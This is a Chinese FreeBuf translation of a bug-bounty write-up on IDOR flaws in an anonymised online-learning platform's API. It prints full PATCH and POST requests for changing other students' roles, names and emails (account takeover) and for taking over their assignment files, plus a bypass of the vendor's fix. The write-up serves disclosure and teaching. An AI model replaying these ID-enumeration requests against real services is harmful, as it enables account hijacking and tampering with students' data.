![](https://image.3001.net/images/20200112/1578818537_5e1adbe91de2d.png!small)

**在[前一篇关于越权漏洞（IDOR）的分享](https://www.freebuf.com/vuls/223987.html)中，我们谈了一些用户功能处存在的隐患点，今天再来聊聊另一个最近发现的IDOR漏洞，出于保密原因，文中提及的目标网站我们以xyz.com代替，漏洞获得厂商$3,650的奖励。**

简单对目标网站xyz.com做个介绍：它是一个在线教育平台，主要提供政治/媒体/历史等方面的培训，其中内置分组聊天功能，几乎全球著名的大学都使用了该平台为在校学生进行辅导教学。在前端应用中，教师（管理者admin）通过创建课程，然后邀请学生（低权限用户）加入课程学习。整个在线教学过程中，将有讨论、作业指导以及课题项目等分类。

首先是，在前端接口服务的讨论分组功能中，存在学生角色可更改的IDOR漏洞，其角色更改请求如下：

    
    
    PATCH /api/api/v1.0/lesson/26201/student_roles/224410 HTTP/1.1
    
    Host: xyz.com
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
    
    Accept: application/json
    
    Accept-Language: en-US,en;q=0.5
    
    Accept-Encoding: gzip, deflate
    
    Referer: <https://xyz.com/>
    
    Access-Token: [REDUCTED]
    
    Content-Type: application/json; charset=utf-8
    
    Content-Length: 43
    
    Connection: close
    
    Cookie: visid_incap_633468=RCwAKw4IRCegxMVVw4Wx+6
    
    {"student_id":"40990","role_guide_id":"22"}

这里存在两个参数，一个是课程管理员ID（Class admin ID）26201，另一个是学生角色ID（Student Role
ID）224410，有点奇怪的是，这个学生角色ID和请求内容中的student_id号40990有关联。所以，如果我们以某个student_id号假设48990为目标，保持课程管理员ID26201不变，通过在一定范围内枚举猜测其学生角色ID（Student
Role ID），这样的话我们完全有可能得到其对应的学生角色ID（Student Role
ID），最终可实现对该生的课程角色变化，如从课程中删除或添加到其它课程等操作。

之后，我又用此方法发现了另外一个请求中的IDOR漏洞：

    
    
    PATCH /api/api/v1.0/user_resource/student/[Victim Id 40994] HTTP/1.1
    
    Host: xyz.com
    
    User-Agent: Mozilla/5.0 
    
    Accept: application/json
    
    Accept-Language: en-US,en;q=0.5
    
    Accept-Encoding: gzip, deflate
    
    Referer: <https://xyz.com>
    
    Access-Token: []
    
    Content-Type: application/json; charset=utf-8
    
    Content-Length: 48
    
    Connection: close
    
    Cookie: [Cookie Reducted]
    
    {"first_name":"john","last_name":"wick"}

在该请求中，通过改变学生的ID号Victim Id，结合请求体中的姓和名的内容，我们就能更改Victim
Id对应学生的姓名信息，原始请求中只有"first_name"和"last_name"参数，之后，我又尝试增加了一个“email”参数，组成以下请求：

    
    
    PATCH /api/api/v1.0/user_resource/student/[Victim Id 40994] HTTP/1.1
    
    Host: xyz.com
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
    
    Accept: application/json
    
    Accept-Language: en-US,en;q=0.5
    
    Accept-Encoding: gzip, deflate
    
    Referer: <https://xyz.com>
    
    Access-Token: []
    
    Content-Type: application/json; charset=utf-8
    
    Content-Length: 48
    
    Connection: close
    
    Cookie: [Cookie Reducted]
    
    {"first_name":"baba","last_name":"yaga","email":"attacker@gmail.com"}

这一改，服务端响应回来状态码为200，竟然是可以的！所以，同样可用枚举生ID号Victim
Id的方式，就能对所有学生信息进行更改了。可以导致：任意学生信息泄露、任意学生信息更改、邮箱更改导致的账户劫持、针对某课程对学生进行任意添加删除、添加成为某课程学员。

其次，在学生作业提交请求中也存在IDOR漏洞，作业提交请求如下：

    
    
    POST /api/api/v1.0/lesson/26201/assessment_answer HTTP/1.1
    
    Host: xyz.com
    
    Connection: close
    
    Content-Length: 778
    
    Accept: application/json
    
    Origin: <https://xyz.com>
    
    Access-Token: 9LgDXO27k1-yScnlUuo_gY5AKIG80y0IvTeCxa2KeZQ
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36
    
    Content-Type: application/json; charset=UTF-8
    
    Referer: <https://xyz.com>
    
    Accept-Encoding: gzip, deflate
    
    Accept-Language: en-US,en;q=0.9
    
    Cookie: []
    
    {"title":"Assignment","student":"40994","section_id":"case","completed":false,"lesson":"26201","assignment":"4579","answers":[{"field_answer":"hello","field_question_ref":"4569"},"file_url":"5830"}

在上述请求中可以看到，其file_url为数据型的，通过更改其中的数值就能把其他学生的提交作业变成我的提交作业了，同时还能看到其他学生的作业信息，如下：

    
    
    HTTP/1.1 200 OK
    
    Accept-Ranges: bytes
    
    Age: 0
    
    Cache-Control: no-cache, must-revalidate
    
    Content-Type: application/json; charset=utf-8
    
    Date: Sun, 12 May 2019 18:01:07 GMT
    
    Expires: Sun, 19 Nov 1978 05:00:00 GMT
    
    Server: Apache/2.2.15 (Red Hat)
    
    Vary: Accept
    
    Via: 1.1 varnish
    
    WebServer: prod1-md
    
    X-API-Version: v1.0
    
    X-Cache: MISS
    
    X-Content-Type-Options: nosniff
    
    X-Drupal-Cache: MISS
    
    X-Powered-By: PHP/7.1.23
    
    X-Varnish: 762262632
    
    Content-Length: 1465
    
    Connection: Close
    
    X-Iinfo: 14-119388817-119389061 NNNN CT(0 0 0) RT(1557684060144 1031) q(0 0 0 -1) r(55 55) U6
    
    X-CDN: Incapsula
    
    {"data":[REDUCTED"file_url":"https:\/\/files.xyz.org\/user_files\/simulation_27244\/MD MEMO_0.docx","REDUCTED}}

在发现以上漏洞后，我及时提交给了厂商，当漏洞修复完成时，我在复测时，又发现了上面这个作业提交请求中还仍然存在IDOR漏洞。修复后的作业提交请求如下：

    
    
    PATCH /api/api/v1.0/lesson/30699/assessment_answer/30709 HTTP/1.1
    
    Host: xyz.com
    
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
    
    Accept: application/json
    
    Accept-Language: en-US,en;q=0.5
    
    Referer: <https://xyz.org/>
    
    Access-Token: HNg-F0wiTIrxDtc1qDQL2TjHv-ERroxmIowIUkM8Blo
    
    Content-Type: application/json; charset=utf-8
    
    Content-Length: 1206
    
    Cookie: [REDUCTED]
    
    {"completed":true,"answers":[{"field_answer":"xyz.burpcollaborator.net","[Reducted]:"xyz.burpcollaborator.net","field_question_ref":"139"}]}

可见，其中确实没有了file_url参数。在BurpSuite中的请求如下：

![](https://image.3001.net/images/20200112/1578818468_5e1adba41fec2.jpeg!small)

响应如下：

![](https://image.3001.net/images/20200112/1578818483_5e1adbb3a1b52.jpeg!small)

奇怪的是，响应内容中可以看到一个“file_url”:null名值对，所以，我又尝试在请求中添加进了“file_url”参数值，果然，还是和修复之前一样可以成功响应！所以最后的经验是，要学会从请求的响应中观察那些隐藏的参数。

![](https://image.3001.net/images/20200112/1578818501_5e1adbc58d7d7.jpeg!small)

 ***参考来源：[medium](https://medium.com/bugbountywriteup/stories-of-idor-part-2-29d313a39e55)，clouds 编译整理，转载请注明来自 FreeBuf.COM**

